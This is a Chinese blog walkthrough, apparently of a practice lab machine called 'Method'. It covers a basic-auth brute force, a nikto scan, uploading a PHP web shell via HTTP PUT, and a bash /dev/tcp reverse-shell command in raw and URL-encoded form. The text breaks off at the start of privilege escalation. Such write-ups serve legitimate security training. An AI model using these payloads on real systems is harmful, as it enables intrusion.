@@ -1,0 +1,522 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>群友靶机--Method - X8@0E的博客</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<meta name="description" content="一、信息收集1.靶机IP确定192.168.88.21 2.端口发现常规22，80端口 3.web信息获取basic认证爆破      登录入口basic认证爆破，拿到用户密码admin:princess101  nikto登陆后无可用信息，用nikto跑一遍。 1nikto -h http:&#x2F;&#x2F;靶机IP -id admin:princess101  根据Nikto扫描结果，发现靶机允许PUT方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="群友靶机--Method">
+<meta property="og:url" content="http://example.com/2025/09/04/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--Method/index.html">
+<meta property="og:site_name" content="X8@0E的博客">
+<meta property="og:description" content="一、信息收集1.靶机IP确定192.168.88.21 2.端口发现常规22，80端口 3.web信息获取basic认证爆破      登录入口basic认证爆破，拿到用户密码admin:princess101  nikto登陆后无可用信息，用nikto跑一遍。 1nikto -h http:&#x2F;&#x2F;靶机IP -id admin:princess101  根据Nikto扫描结果，发现靶机允许PUT方法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904175824424.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904175930485.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904175954908.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904180050048.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904193420444.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904193537022.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904193632035.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904194602840.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904195131442.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904195506147.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904195612763.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904200306734.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904202415217.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904203020064.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904202932189.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904203653037.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904203706889.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904204848002.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904205914907.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904210023979.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904220154771.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904220249120.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904220507105.png">
+<meta property="article:published_time" content="2025-09-04T09:18:03.982Z">
+<meta property="article:modified_time" content="2025-09-15T03:06:37.469Z">
+<meta property="article:author" content="X8@0E">
+<meta property="article:tag" content="basic认证爆破">
+<meta property="article:tag" content="nikto">
+<meta property="article:tag" content="put方法">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250904175824424.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1761989925315">
+
+<link rel="stylesheet" href="/css/style.css?v=1761989925315">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1761989925315">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1761989925316"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/55f0c32a6a773efe8c6a6a8158a06f18.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="X8@0E"><img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="X8@0E">
+            <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E" alt="X8@0E">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>43</div>
+        <div><span>标签</span>77</div>
+        <div><span>分类</span>14</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-douban-fill"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1761989925316"></script>
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://blog.csdn.net/2301_81325456/article/details/147025965"
+			target="_blank"
+			mdui-tooltip="{content: 'CSDN'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Crypto/">Crypto</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/NSSCTF/">NSSCTF</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnhub/">Vulnhub</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnvm靶机复现/">Vulnvm靶机复现</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-信息收集/">ctfshow-web-信息收集</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-命令执行/">ctfshow-web-命令执行</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件上传/">ctfshow-web-文件上传</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件包含/">ctfshow-web-文件包含</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-爆破/">ctfshow-web-爆破</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/sql注入/">sql注入</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulhub/">vulhub</a>
+          <span class="category-list-count">7</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulnhub/">vulnhub</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/群友靶机/">群友靶机</a>
+          <span class="category-list-count">15</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/自制靶机/">自制靶机</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/1Panel/" style="font-size: 10px;">1Panel</a> <a href="/tags/3%E4%B8%AA%E7%82%B9/" style="font-size: 10px;">3个点</a> <a href="/tags/Argon2Cracker/" style="font-size: 10px;">Argon2Cracker</a> <a href="/tags/Cookie-GLOBALS/" style="font-size: 10px;">Cookie--GLOBALS</a> <a href="/tags/Cypher%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">Cypher注入</a> <a href="/tags/DC/" style="font-size: 15px;">DC</a> <a href="/tags/GIF%E7%BB%95%E8%BF%87/" style="font-size: 10px;">GIF绕过</a> <a href="/tags/Jinja2/" style="font-size: 10px;">Jinja2</a> <a href="/tags/JoomScan/" style="font-size: 10px;">JoomScan</a> <a href="/tags/LFI%E5%88%B0RCE-open%E5%87%BD%E6%95%B0/" style="font-size: 10px;">LFI到RCE(open函数)</a> <a href="/tags/NSSCTF/" style="font-size: 15px;">NSSCTF</a> <a href="/tags/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">Nginx解析漏洞</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/RUNPATH/" style="font-size: 10px;">RUNPATH</a> <a href="/tags/Rabbit/" style="font-size: 10px;">Rabbit</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/Vulnhub/" style="font-size: 15px;">Vulnhub</a> <a href="/tags/Vulnvm/" style="font-size: 10px;">Vulnvm</a> <a href="/tags/WAF/" style="font-size: 10px;">WAF</a> <a href="/tags/WPA-01-cap/" style="font-size: 10px;">WPA-01.cap</a> <a href="/tags/aircrack-ng/" style="font-size: 10px;">aircrack-ng</a> <a href="/tags/basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">basic认证爆破</a> <a href="/tags/cgi%E6%96%87%E4%BB%B6/" style="font-size: 10px;">cgi文件</a> <a href="/tags/ctfshow/" style="font-size: 20px;">ctfshow</a> <a href="/tags/dirtycow/" style="font-size: 10px;">dirtycow</a> <a href="/tags/docker%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/" style="font-size: 10px;">docker交互式shell</a> <a href="/tags/drupal/" style="font-size: 10px;">drupal</a> <a href="/tags/ffuf/" style="font-size: 10px;">ffuf</a> <a href="/tags/flask/" style="font-size: 10px;">flask</a> <a href="/tags/fork%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E/" style="font-size: 10px;">fork解决断连</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/ghfs/" style="font-size: 10px;">ghfs</a> <a href="/tags/ldd/" style="font-size: 10px;">ldd</a> <a href="/tags/les-sh/" style="font-size: 10px;">les.sh</a> <a href="/tags/linpeas-sh/" style="font-size: 10px;">linpeas.sh</a> <a href="/tags/lsattr-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7/" style="font-size: 10px;">lsattr--查看文件扩展属性</a> <a href="/tags/motto/" style="font-size: 10px;">motto</a> <a href="/tags/msfvenom/" style="font-size: 15px;">msfvenom</a> <a href="/tags/mysql-old-password/" style="font-size: 10px;">mysql_old_password</a> <a href="/tags/nikto/" style="font-size: 10px;">nikto</a> <a href="/tags/nohup/" style="font-size: 10px;">nohup</a> <a href="/tags/php%E6%8F%90%E6%9D%83root/" style="font-size: 10px;">php提权root</a> <a href="/tags/poc/" style="font-size: 10px;">poc</a> <a href="/tags/put%E6%96%B9%E6%B3%95/" style="font-size: 10px;">put方法</a> <a href="/tags/python3-5/" style="font-size: 10px;">python3.5</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/readelf/" style="font-size: 10px;">readelf</a> <a href="/tags/scp/" style="font-size: 10px;">scp</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql二次注入</a> <a href="/tags/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/" style="font-size: 10px;">ssh弱口令爆破</a> <a href="/tags/ssh%E7%A7%98%E9%92%A5%E7%94%9F%E6%88%90%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">ssh秘钥生成连接</a> <a href="/tags/stegseek/" style="font-size: 10px;">stegseek</a> <a href="/tags/suForce/" style="font-size: 10px;">suForce</a> <a href="/tags/url%E6%88%AA%E6%96%AD/" style="font-size: 10px;">url截断</a> <a href="/tags/vite/" style="font-size: 10px;">vite</a> <a href="/tags/web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">web命令执行</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">web文件上传</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">web文件包含</a> <a href="/tags/web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">web源码泄露</a> <a href="/tags/web%E7%88%86%E7%A0%B4/" style="font-size: 10px;">web爆破</a> <a href="/tags/x-forwarded-for%E7%9A%84ip%E6%AC%BA%E9%AA%97/" style="font-size: 10px;">x-forwarded-for的ip欺骗</a> <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2025-30208/" style="font-size: 10px;">任意文件读取漏洞(CVE-2025-30208)</a> <a href="/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/" style="font-size: 10px;">凯撒密码</a> <a href="/tags/%E5%90%8E%E9%9D%A2%E5%8A%A0-jpg%E5%90%8E%E7%BC%80/" style="font-size: 10px;">后面加.jpg后缀</a> <a href="/tags/%E5%9F%9F%E6%8E%A7/" style="font-size: 10px;">域控</a> <a href="/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">密码爆破</a> <a href="/tags/%E6%8F%90%E6%9D%83-env-reset/" style="font-size: 10px;">提权!env_reset</a> <a href="/tags/%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">插件漏洞</a> <a href="/tags/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-ua%E6%B7%BB%E5%8A%A0%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">日志注入+ua添加木马</a> <a href="/tags/%E6%AD%A3%E5%90%91shell/" style="font-size: 10px;">正向shell</a> <a href="/tags/%E7%8A%B6%E6%80%81%E7%A0%81/" style="font-size: 10px;">状态码</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" style="font-size: 10px;">环境变量</a> <a href="/tags/%E7%A9%BA%E6%A0%BC/" style="font-size: 10px;">空格</a> <a href="/tags/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/" style="font-size: 10px;">维吉尼亚密码</a> <a href="/tags/%E8%9A%81%E5%89%91/" style="font-size: 10px;">蚁剑</a> <a href="/tags/%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96/" style="font-size: 10px;">越界读取</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(77);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">43</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/20/Crypto/">Crypto</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/11/%E6%B5%81%E9%87%8F%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/">流量分析恶意攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/09/hackableII/">hackablell</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/07/Me-and-My-Girlfriend-1/">Me-and-My-Girlfriend-1</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="" target="_blank" >
+                    <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></img>
+                    <p>X8@0E</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2025 X8@0E
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="https://pic4.zhimg.com/v2-a6987559e8daa710417d1d4d58de2f52_r.jpg?source=1940ef5c" alt="群友靶机--Method" loading="lazy">
+            <h1>群友靶机--Method</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2025年09月04日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1-靶机IP确定"><a href="#1-靶机IP确定" class="headerlink" title="1.靶机IP确定"></a>1.靶机IP确定</h2><p>192.168.88.21</p>
+<h2 id="2-端口发现"><a href="#2-端口发现" class="headerlink" title="2.端口发现"></a>2.端口发现</h2><p>常规22，80端口</p>
+<h2 id="3-web信息获取"><a href="#3-web信息获取" class="headerlink" title="3.web信息获取"></a>3.web信息获取</h2><h3 id="basic认证爆破"><a href="#basic认证爆破" class="headerlink" title="basic认证爆破"></a>basic认证爆破</h3><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904175824424.png" alt="image-20250904175824424" data-caption="image-20250904175824424" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904175930485.png" alt="image-20250904175930485" data-caption="image-20250904175930485" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904175954908.png" alt="image-20250904175954908" data-caption="image-20250904175954908" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904180050048.png" alt="image-20250904180050048" data-caption="image-20250904180050048" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904193420444.png" alt="image-20250904193420444" data-caption="image-20250904193420444" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904193537022.png" alt="image-20250904193537022" data-caption="image-20250904193537022" loading="lazy"></p>
+<p>登录入口basic认证爆破，拿到用户密码admin:princess101</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904193632035.png" alt="image-20250904193632035" data-caption="image-20250904193632035" loading="lazy"></p>
+<h3 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h3><p>登陆后无可用信息，用nikto跑一遍。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://靶机IP -<span class="built_in">id</span> admin:princess101</span><br></pre></td></tr></table></figure>
+
+<p>根据Nikto扫描结果，发现靶机允许PUT方法，上传个shell.php，反弹即可。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904194602840.png" alt="image-20250904194602840" data-caption="image-20250904194602840" loading="lazy"></p>
+<h3 id="put方法"><a href="#put方法" class="headerlink" title="put方法"></a>put方法</h3><p>这是一个<strong>高危</strong>信号！PUT方法允许客户端向服务器上传文件。如果服务器配置不当，开启了PUT方法，你就可以直接上传一个Web Shell。bp抓包提交。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904195131442.png" alt="image-20250904195131442" data-caption="image-20250904195131442" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904195506147.png" alt="image-20250904195506147" data-caption="image-20250904195506147" loading="lazy"></p>
+<p>shell2.php上传成功之后直接访问可知可以执行系统命令了就可以反弹一个shell回来</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904195612763.png" alt="image-20250904195612763" data-caption="image-20250904195612763" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.88.10/4444 0&gt;&amp;1&#x27;</span><br><span class="line"></span><br><span class="line">http://192.168.88.21/shell2.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.88.10/1234+0%3E%261%27    //URL 编码的反向 Shell (Reverse Shell) 载荷</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250904200306734.png" alt="image-20250904200306734" data-caption="image-20250904200306734" loading="lazy"></p>
+<h1 id="二、提权"><a href="#二、提权" class="headerlink" title="二、提权"></a>二、提权</h1><h2 id="www-data-bamuwe"><a href="#www-data-bamuwe" class="headerlink" title="www-data-&gt;bamuwe"></a>www-data-&gt;bamuwe</h2><h3 id="1-信息获取"><a href="#1-信息获取" class="headerlink" title="1.信息获取"></a>1.信息获取</h3><p>cat &#x2F;etc&#x2F;passwd中发现‘bamuwe’用户，在&#x2F;opt下发现两个相关文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-rwxr-xr-x 1 bamuwe bamuwe 16936 Jul 31 07:41 bamuwe</span><br><span class="line">-rwxr-xr-x 1 root root 4729 Jul 31 07:21 pyrat.py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span 